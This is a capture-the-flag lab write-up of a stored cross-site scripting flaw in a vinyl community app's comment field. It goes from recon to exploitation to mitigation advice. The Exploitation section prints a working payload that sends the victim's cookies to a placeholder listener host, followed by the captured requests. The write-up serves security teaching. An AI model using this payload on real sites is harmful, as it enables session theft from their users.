---
title: "Stored XSS Leads to Admin Cookie Exfiltration | Crate & Sleeve"
date: 2026-06-20 01:00:00 +0530
categories: [A05 - Injection, Cross-Site Scripting]
tags: [stored-xss, xss, cookie-exfiltration, admin-bot, webverselabs-pro, inscription, crate-and-sleeve]
platform: WebVerseLabs Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/inscription.webp
  alt: Inscription Stored XSS cover image
---

## Lab Link

[Crate & Sleeve - WebVerseLabs Pro](https://dashboard.webverselabs-pro.com/challenges/inscription)

---

## Overview

The **Inscription** challenge hosted a vinyl community application named **Crate & Sleeve**. Users could view record listings and leave comments on individual listing pages.

The comment feature accepted user-controlled HTML and rendered it back on the listing page without proper sanitization. This allowed a stored cross-site scripting payload to execute when another user or the admin bot viewed the affected listing.

By using an out-of-band interact endpoint, I confirmed JavaScript execution in the victim browser and captured the sensitive cookie containing the challenge flag.

## Objective

The goal was to identify a client-side injection issue, trigger it through the application workflow, and retrieve the flag from the privileged browser context.

## Vulnerability Identification

The vulnerable functionality was the comment box on a listing page:

```http
GET /listing.php?id=12 HTTP/2
Host: <LAB_HOST>
```

The application allowed the logged-in user to post a comment. Since comments appeared on the listing page after submission, this was a strong candidate for **stored XSS** testing.

A basic HTML event-handler payload was used because image loading errors trigger JavaScript through the `onerror` attribute.

## Recon / Approach

I first navigated to a listing page and checked whether comments were stored and displayed back to users.

The application showed:

- A listing page at `/listing.php?id=12`
- A visible comment form
- The current logged-in user as `kelvin`
- Previously posted content rendered on the page

Because the comment content was rendered into the page, I tested whether HTML tags and event handlers were filtered or escaped.

## Exploitation

The following payload was submitted in the comment field:

```html
<img src=x onerror="fetch('http://<INTERACT_HOST>/?c='+document.cookie)">
```

After posting the comment, the payload was stored on the listing page.

When the page was later viewed by the privileged bot/user, the browser attempted to load the invalid image source `x`. Since the image failed to load, the `onerror` handler executed and sent the victim's cookies to the interact endpoint.

The out-of-band listener received requests similar to:

```http
GET /?c=WEBVERSE%7B...REDACTED...%7D HTTP/1.1
Host: <INTERACT_HOST>
```

The important part was the `c` query parameter, which contained the URL-encoded flag cookie.

## Proof / Flag

The interact history confirmed successful execution from the victim environment:

```text
GET /?c=WEBVERSE%7B...REDACTED...%7D
Source IP: 172.18.0.3
```

After URL decoding the value, the flag format was confirmed:

```text
WEBVERSE{...REDACTED...}
```

## Root Cause

The application stored and rendered user-supplied comments without applying proper output encoding or sanitization.

The vulnerable pattern was:

```text
User comment input → stored in database → rendered as HTML → JavaScript execution
```

Because the comment body was treated as trusted HTML, attacker-controlled event handlers such as `onerror` could run in another user's browser.

## Impact

This vulnerability allowed an attacker to:

- Execute arbitrary JavaScript in the context of other users
- Steal cookies if they were not protected with `HttpOnly`
- Perform actions as the victim user
- Target privileged users or admin bots through stored content
- Exfiltrate sensitive challenge data such as the flag

In this lab, the stored XSS directly led to cookie exfiltration and flag disclosure.

## Mitigation

To fix this issue:

- Encode user-generated content before rendering it into HTML
- Use a trusted HTML sanitizer if limited formatting is required
- Set sensitive cookies with the `HttpOnly`, `Secure`, and `SameSite` attributes
- Apply a strict Content Security Policy to reduce XSS impact
- Validate and sanitize input on the server side
- Avoid rendering raw user input directly inside templates

A safer rendering approach would treat comments as text, not HTML.

## Lessons Learned

Stored XSS is more dangerous than reflected XSS because the payload persists and can automatically execute whenever another user views the affected page.

In this challenge, a simple comment field became a persistent execution point. Once the admin or bot loaded the listing, the payload executed in the privileged browser context and leaked the flag-bearing cookie to the interact server.

The key takeaway is that every user-controlled field that is stored and later rendered should be treated as untrusted until it is safely encoded or sanitized.
